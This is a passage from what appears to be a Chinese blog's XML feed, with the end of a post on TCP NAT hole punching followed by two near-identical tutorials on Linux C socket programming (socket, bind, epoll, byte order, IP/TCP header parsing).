<li>A使用另外的端口（打洞端口）连接服务器C的<strong>协助打洞端口</strong>，服务器获取到A打洞的ip加端口，<strong>同时在该端口号上启动侦听（如果是NAT类型1可能直接就连接成功）</strong>。注意由于要在相同的网络终端上绑定到不同的套接字上，所以必须为这些套接字设置<code>SO_REUSEADDR</code>属性（即允许重用），否则侦听会失败。</li>
<li>B也连接服务器C的<strong>协助打洞端口</strong>，但连接后立刻断开，并启用监听。这时候C获取到B的公网ip和端口。</li>
<li>C通过<strong>主连接端口</strong>告诉B：A打洞的公网ip和端口。</li>
<li>B向A发起TCP连接请求（如果为NAT类型1，这一步就已经可以建立连接），被NAT-A过滤掉，但是NAT-B添加规则$B \Leftrightarrow A$</li>
<li>B通过<strong>主连接端口</strong>告诉C：我已经准备好了。</li>
<li>C通过<strong>主连接端口</strong>告诉A：B打洞的公网ip和端口。</li>
<li>A向B发起TCP连接，到此连接成功，NAT-A也添加规则$A \Leftrightarrow B$。</li>
</ol>
<p>这一步由于需要进行网络编程进行验证，代码没来得及写完，没来得及验证。</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>linux网络编程（C语言）</title>
    <url>/blogs/2019-03-22-networkProgramC/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>操作系统: Linux</li>
<li>编译器: make</li>
</ul>
<h1 id="一、套接字"><a href="#一、套接字" class="headerlink" title="一、套接字"></a>一、套接字</h1><ul>
<li>TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口。</li>
<li>套接字用（IP地址：端口号）表示。</li>
<li>它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：<ul>
<li>连接使用的协议</li>
<li>本地主机的IP地址</li>
<li>本地进程的协议端口</li>
<li>远地主机的IP地址</li>
<li>远地进程的协议端口。</li>
</ul>
</li>
</ul>
<h2 id="1-创建一个套接字"><a href="#1-创建一个套接字" class="headerlink" title="1. 创建一个套接字"></a>1. 创建一个套接字</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 创建一个套接字</span></span><br><span class="line"><span class="comment"> * @param __domain 指明使用的协议族</span></span><br><span class="line"><span class="comment"> * @param __type 指明socket类型</span></span><br><span class="line"><span class="comment"> * @param __protocol 协议类型</span></span><br><span class="line"><span class="comment"> * @return -1，出错；其他，描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">socket</span> <span class="params">(<span class="type">int</span> __domain, <span class="type">int</span> __type, <span class="type">int</span> __protocol)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-1-参数取值"><a href="#1-1-参数取值" class="headerlink" title="1.1. 参数取值"></a>1.1. 参数取值</h3><p><strong><code>__domain</code> 指明使用的协议族</strong></p>
<ul>
<li><code>AF_INET</code>: Address Family，指定TCP&#x2F;IP协议家族</li>
<li><code>PF_INET</code>: Protocol Family<ul>
<li>在windows中 <code>AF_INET</code>和<code>PF_INET</code>完全一样</li>
<li>在某些Linux中两者会有差距（但一般也相同），理论上建立socket时是指定协议，应该用<code>PF_XXX</code>，设置地址时用<code>AF_XXX</code>，不过在两者相等的情况下混用也没啥。</li>
</ul>
</li>
<li><code>AF_UNIX</code>: 域套接字，用于同一台计算机的进程间通信</li>
<li><code>AF_INET6</code>:ipv6网络协议</li>
</ul>
<p><strong><code>__type</code> 指明socket类型</strong></p>
<ul>
<li><code>SOCK_STREAM</code>: 流套接字，对应TCP协议</li>
<li><code>SOCK_DGRAM</code>: 数据报套接字，对应UDP协议</li>
<li><code>SOCK_RAW</code>: 原始套接字，提供原始网络协议存取</li>
<li><code>SOCK_PACKET</code>: 直接从网络驱动获取数据，即从数据链路层开始处理（过时了）<ul>
<li>如果想获取数据链路层，可用<code>socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL))</code></li>
</ul>
</li>
</ul>
<p><code>__protocol</code> 协议类型</p>
<ul>
<li>传输层: <code>IPPROTO_TCP</code>、<code>IPPROTO_UDP</code>、<code>IPPROTO_ICMP</code></li>
<li>网络层: <code>htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL)</code></li>
</ul>
<p><strong><font color="red">三者参数并不完全独立，比如type选用<code>sock_stream</code>，protocol就得是<code>IPPRPTP_TCP</code></font></strong></p>
<h2 id="2-绑定协议地址"><a href="#2-绑定协议地址" class="headerlink" title="2. 绑定协议地址"></a>2. 绑定协议地址</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 将套接字绑定本地端口</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __addr 指向要绑定给sockfd的协议地址</span></span><br><span class="line"><span class="comment"> * @param __len 地址的长度</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span> <span class="params">(<span class="type">int</span> __fd, __CONST_SOCKADDR_ARG __addr, <span class="type">socklen_t</span> __len)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="2-1-参数取值"><a href="#2-1-参数取值" class="headerlink" title="2.1. 参数取值"></a>2.1. 参数取值</h3><p><code>__addr</code> 指向要绑定给sockfd的协议地址</p>
<p><strong>赋值时需要转换为<a href="#networkByte">网络字节序</a></strong><br><strong>网络地址的转换可以使用<a href="#networkAddress">工具函数</a></strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __CONST_SOCKADDR_ARG	const struct sockaddr *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv4取值</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line">    <span class="type">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="type">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr;   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">in_addr</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv6取值</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in6</span> &#123;</span><br><span class="line">    <span class="type">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span></span><br><span class="line">    <span class="type">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span></span><br><span class="line">    <span class="type">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in6_addr</span> sin6_addr;     <span class="comment">/* IPv6 address */</span></span><br><span class="line">    <span class="type">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">in6_addr</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Unix取值</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_un</span> &#123;</span><br><span class="line">    <span class="type">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span></span><br><span class="line">    <span class="type">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="二、连接"><a href="#二、连接" class="headerlink" title="二、连接"></a>二、连接</h1><h2 id="1-TCP连接"><a href="#1-TCP连接" class="headerlink" title="1. TCP连接"></a>1. TCP连接</h2><h3 id="1-1-TCP服务器"><a href="#1-1-TCP服务器" class="headerlink" title="1.1. TCP服务器"></a>1.1. TCP服务器</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 开始监听</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __n 等待连接的队列长度</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listen</span> <span class="params">(<span class="type">int</span> __fd, <span class="type">int</span> __n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 阻塞式接受第一个连接</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __addr 连接地址指针</span></span><br><span class="line"><span class="comment"> * @param __addr_len 地址长度指针</span></span><br><span class="line"><span class="comment"> * @return 连接套接字描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">accept</span> <span class="params">(<span class="type">int</span> __fd, __SOCKADDR_ARG __addr, <span class="type">socklen_t</span> *__restrict __addr_len)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-TCP客户端"><a href="#1-2-TCP客户端" class="headerlink" title="1.2. TCP客户端"></a>1.2. TCP客户端</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @description 开始监听</span></span><br><span class="line"><span class="comment">    * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment">    * @param __n 等待连接的队列长度</span></span><br><span class="line"><span class="comment">    * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-UDP连接"><a href="#2-UDP连接" class="headerlink" title="2. UDP连接"></a>2. UDP连接</h2><h1 id="三、select-poll-epoll"><a href="#三、select-poll-epoll" class="headerlink" title="三、select&#x2F;poll&#x2F;epoll"></a>三、select&#x2F;poll&#x2F;epoll</h1><h2 id="1-select"><a href="#1-select" class="headerlink" title="1. select"></a>1. select</h2><ul>
<li>windows和linux都存在select</li>
<li>select可以同时监听多个文件描述符，但是对描述符的处理是轮询的方式，对本地fd池一个一个扫描看是否有数据</li>
<li>最大支持<code>FD_SETSIZE</code>个文件描述符，一般为<code>1024/2048</code></li>
</ul>
<h2 id="2-poll"><a href="#2-poll" class="headerlink" title="2. poll"></a>2. poll</h2><ul>
<li>在select基础上去除了文件描述符的限制</li>
<li>轮询机制还是保留了</li>
</ul>
<h1 id="四、epoll"><a href="#四、epoll" class="headerlink" title="四、epoll"></a>四、epoll</h1><ul>
<li>epoll是linux特有的系统调用，windows没有此实现，使用mingw是模拟的一种实现</li>
<li>epoll和select区别是，对于fd池的处理，epoll不会一个一个扫描，而是在内核注册了通知机制，当某个fd出现时间，内核会直接通知epoll</li>
<li>epoll返回的就直接是fd的事件信息，这样防止了扫描带来的开销</li>
</ul>
<h2 id="1-epoll的调用"><a href="#1-epoll的调用" class="headerlink" title="1. epoll的调用"></a>1. epoll的调用</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-epoll下socket是否要设置为非阻塞"><a href="#2-epoll下socket是否要设置为非阻塞" class="headerlink" title="2. epoll下socket是否要设置为非阻塞"></a>2. epoll下socket是否要设置为非阻塞</h2><p><a href="https://blog.csdn.net/boiled_water123/article/details/104161471">使用epoll时需要将socket设为非阻塞吗？</a></p>
<ol>
<li>监听的服务端fd，最好使用水平触发模式，边沿触发可能导致部分客户端连接不上</li>
<li>客户端fd，使用水平触发时，阻塞非阻塞都可以，建议设置非阻塞</li>
<li>客户端fd，使用边沿触发时，必须使用非阻塞io，否则会卡在读取调用上。但是要求必须一次读完所有数据，否则可能存在数据没有处理。</li>
</ol>
<h1 id="五、网络编程"><a href="#五、网络编程" class="headerlink" title="五、网络编程"></a>五、网络编程</h1><h2 id="1-头文件"><a href="#1-头文件" class="headerlink" title="1. 头文件"></a>1. 头文件</h2><h3 id="1-1-netinet和linux下的头文件区别"><a href="#1-1-netinet和linux下的头文件区别" class="headerlink" title="1.1. netinet和linux下的头文件区别"></a>1.1. netinet和linux下的头文件区别</h3><ul>
<li>netinet是用户空间的接口头文件，一般是应用程序使用</li>
<li>linux下是linux内核使用，一般是内核相关操作使用</li>
</ul>
<h2 id="2-一些工具函数"><a href="#2-一些工具函数" class="headerlink" title="2. 一些工具函数"></a>2. 一些工具函数</h2><h3 id="2-1-网络字节序转换"><a href="#2-1-网络字节序转换" class="headerlink" title="2.1. 网络字节序转换"></a>2.1. <span id = "networkByte">网络字节序转换</span></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ntohl</span> <span class="params">(<span class="type">uint32_t</span> __netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint16_t</span> <span class="title">ntohs</span> <span class="params">(<span class="type">uint16_t</span> __netshort)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">htonl</span> <span class="params">(<span class="type">uint32_t</span> __hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint16_t</span> <span class="title">htons</span> <span class="params">(<span class="type">uint16_t</span> __hostshort)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-网络地址转换-in-addr-t和char"><a href="#2-2-网络地址转换-in-addr-t和char" class="headerlink" title="2.2. 网络地址转换 in_addr_t和char *"></a>2.2. <span id = "networkAddress">网络地址转换 <code>in_addr_t</code>和<code>char *</code></span></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @description 将数字-点方式(192.168.1.1)的ip字符串转成in_addr_t格式</span></span><br><span class="line"><span class="comment">    * @param __cp 字符串</span></span><br><span class="line"><span class="comment">    * @return in_addr_t类型地址</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="function"><span class="type">in_addr_t</span> <span class="title">inet_addr</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__cp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert a Internet address in binary network format for interface</span></span><br><span class="line"><span class="comment">   type AF in buffer starting at CP to presentation form and place</span></span><br><span class="line"><span class="comment">   result in buffer of length LEN astarting at BUF.  */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *<span class="title">inet_ntop</span> <span class="params">(<span class="type">int</span> __af, <span class="type">const</span> <span class="type">void</span> *__restrict __cp,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="type">char</span> *__restrict __buf, <span class="type">socklen_t</span> __len)</span></span></span><br><span class="line"><span class="function">     __THROW</span>;</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 转成ip结构体判断</span></span><br><span class="line">    ipheader = (<span class="keyword">struct</span> iphdr *)buf;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ipbuf1[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 打印ip用</span></span><br><span class="line">    <span class="type">char</span> ipbuf2[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 打印ip用</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> addr1 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> addr2 = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    addr1.s_addr = ipheader-&gt;saddr;  <span class="comment">// 注意这里是网络字节序，不是本地字节序</span></span><br><span class="line">    addr2.s_addr = ipheader-&gt;daddr;  <span class="comment">// 注意这里是网络字节序，不是本地字节序</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_INFO</span>(<span class="string">&quot;src-&gt;dst: %s-&gt;%s&quot;</span>, <span class="built_in">inet_ntop</span>(AF_INET, &amp;addr1, ipbuf1, <span class="built_in">sizeof</span>(ipbuf1)),</span><br><span class="line">             <span class="built_in">inet_ntop</span>(AF_INET, &amp;addr2, ipbuf2, <span class="built_in">sizeof</span>(ipbuf2)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-分片包处理"><a href="#3-分片包处理" class="headerlink" title="3. 分片包处理"></a>3. 分片包处理</h2><p>主要用到一些宏</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 转成ip结构体判断</span></span><br><span class="line">    ipheader = (<span class="keyword">struct</span> iphdr *)ptr;</span><br><span class="line">    frag_flag = <span class="built_in">ntohs</span>(ipheader-&gt;frag_off);  <span class="comment">// 注意这里用主机字节序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((frag_flag &amp; IP_DF) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 分片包</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> ((frag_flag &amp; IP_OFFMASK) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 分片包首包</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-tcp头处理"><a href="#4-tcp头处理" class="headerlink" title="4. tcp头处理"></a>4. tcp头处理</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tcpheader[] = &#123;<span class="number">0x60</span>, <span class="number">0xe0</span>, <span class="number">0xef</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc5</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x55</span>, <span class="number">0xce</span>,</span><br><span class="line">                             <span class="number">0x63</span>, <span class="number">0xb5</span>, <span class="number">0x50</span>, <span class="number">0x10</span>, <span class="number">0x25</span>, <span class="number">0x17</span>, <span class="number">0xb1</span>, <span class="number">0x0e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    tcphdr *th = (tcphdr *)tcpheader;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_HEX</span>(tcpheader, <span class="built_in">sizeof</span>(tcphdr));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;source %u&quot;</span>, <span class="built_in">htons</span>(th-&gt;source));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;dest %u&quot;</span>, <span class="built_in">htons</span>(th-&gt;dest));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;seq %u&quot;</span>, <span class="built_in">htonl</span>(th-&gt;seq));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;ack_seq %u&quot;</span>, <span class="built_in">htonl</span>(th-&gt;ack_seq));</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;doff %u&quot;</span>, th-&gt;doff);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;res1 %04u&quot;</span>, th-&gt;res1);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;res2 %02u&quot;</span>, th-&gt;res2);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;urg %u&quot;</span>, th-&gt;urg);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;ack %u&quot;</span>, th-&gt;ack);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;psh %u&quot;</span>, th-&gt;psh);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;rst %u&quot;</span>, th-&gt;rst);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;syn %u&quot;</span>, th-&gt;syn);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;fin %u&quot;</span>, th-&gt;fin);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;th-&gt;th_flags %#x&quot;</span>, th-&gt;th_flags);</span><br><span class="line">    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;is ack&quot;</span>, (th-&gt;th_flags &amp; TH_ACK) == TH_ACK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="1-TCP连接后，一方断电，另一方是无法检测到对方断电的"><a href="#1-TCP连接后，一方断电，另一方是无法检测到对方断电的" class="headerlink" title="1. TCP连接后，一方断电，另一方是无法检测到对方断电的"></a>1. TCP连接后，一方断电，另一方是无法检测到对方断电的</h2><ul>
<li>TCP连接并没有检测机制，所以一方断电，另一方无法检测到。</li>
<li>强行退出程序，操作系统会回收资源，内部执行关闭套接字，所以客户端可以检测到断开连接。</li>
</ul>
<h2 id="2-SO-KEEPALIVE-保活"><a href="#2-SO-KEEPALIVE-保活" class="headerlink" title="2. SO_KEEPALIVE 保活"></a>2. SO_KEEPALIVE 保活</h2><p>TCP连接选项中有一项是心跳保活机制，但并不是规范的一部分，官方RFC罗列不适用的三个理由:</p>
<ol>
<li>在短暂的故障期间，可能使一个良好的连接被释放</li>
<li>占用了不必要的贷款</li>
<li>在以数据包计费的网络上花费额外的金钱</li>
</ol>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>linux网络编程（C语言）</title>
    <url>/blogs/2019-03-22-linuxNetworkProgramC/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>操作系统: Linux</li>
<li>编译器: make</li>
</ul>
<h1 id="一、套接字"><a href="#一、套接字" class="headerlink" title="一、套接字"></a>一、套接字</h1><ul>
<li>TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口。</li>
<li>套接字用（IP地址：端口号）表示。</li>
<li>它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：<ul>
<li>连接使用的协议</li>
<li>本地主机的IP地址</li>
<li>本地进程的协议端口</li>
<li>远地主机的IP地址</li>
<li>远地进程的协议端口。</li>
</ul>
</li>
</ul>
<h2 id="1-创建一个套接字"><a href="#1-创建一个套接字" class="headerlink" title="1. 创建一个套接字"></a>1. 创建一个套接字</h2><p>调用参考文档 <a href="https://www.ibm.com/docs/en/zos/2.3.0?topic=functions-socket-create-socket">socket() — Create a socket</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 创建一个套接字</span></span><br><span class="line"><span class="comment"> * @param __domain 指明使用的协议族</span></span><br><span class="line"><span class="comment"> * @param __type 指明socket类型</span></span><br><span class="line"><span class="comment"> * @param __protocol 协议类型</span></span><br><span class="line"><span class="comment"> * @return -1，出错；其他，描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">socket</span> <span class="params">(<span class="type">int</span> __domain, <span class="type">int</span> __type, <span class="type">int</span> __protocol)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-1-参数取值"><a href="#1-1-参数取值" class="headerlink" title="1.1. 参数取值"></a>1.1. 参数取值</h3><p><strong><code>__domain</code> 指明使用的协议族</strong></p>
<ul>
<li><code>AF_INET</code>: Address Family，指定TCP&#x2F;IP协议家族</li>
<li><code>PF_INET</code>: Protocol Family<ul>
<li>在windows中 <code>AF_INET</code>和<code>PF_INET</code>完全一样</li>
<li>在某些Linux中两者会有差距（但一般也相同），理论上建立socket时是指定协议，应该用<code>PF_XXX</code>，设置地址时用<code>AF_XXX</code>，不过在两者相等的情况下混用也没啥。</li>
</ul>
</li>
<li><code>AF_UNIX</code>: 域套接字，用于同一台计算机的进程间通信</li>
<li><code>AF_INET6</code>:ipv6网络协议</li>
</ul>
<p><strong><code>__type</code> 指明socket类型</strong></p>
<ul>
<li><code>SOCK_STREAM</code>: 流套接字，对应TCP协议</li>
<li><code>SOCK_DGRAM</code>: 数据报套接字，对应UDP协议</li>
<li><code>SOCK_RAW</code>: 原始套接字，提供原始网络协议存取</li>
<li><code>SOCK_PACKET</code>: 直接从网络驱动获取数据，即从数据链路层开始处理（过时了）<ul>
<li>如果想获取数据链路层，可用<code>socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL))</code></li>
</ul>
</li>
</ul>
<p><code>__protocol</code> 协议类型</p>
<ul>
<li>传输层: <code>IPPROTO_TCP</code>、<code>IPPROTO_UDP</code>、<code>IPPROTO_ICMP</code></li>
<li>网络层: <code>htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL)</code></li>
</ul>
<p><strong><font color="red">三者参数并不完全独立，比如type选用<code>SOCK_STREAM</code>，protocol就得是<code>IPPRPTP_TCP</code></font></strong></p>
<h2 id="2-绑定协议地址"><a href="#2-绑定协议地址" class="headerlink" title="2. 绑定协议地址"></a>2. 绑定协议地址</h2><ul>
<li>绑定地址后，可以使用地址进行读写和监听，这里会判断是否已被占用</li>
<li>如果端口想要复用，可以使用setsockopt设置socket为可以重复使用地址</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 将套接字绑定本地端口</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __addr 指向要绑定给sockfd的协议地址</span></span><br><span class="line"><span class="comment"> * @param __len 地址的长度</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bind</span> <span class="params">(<span class="type">int</span> __fd, __CONST_SOCKADDR_ARG __addr, <span class="type">socklen_t</span> __len)</span></span></span><br></pre></td></tr></table></figure>

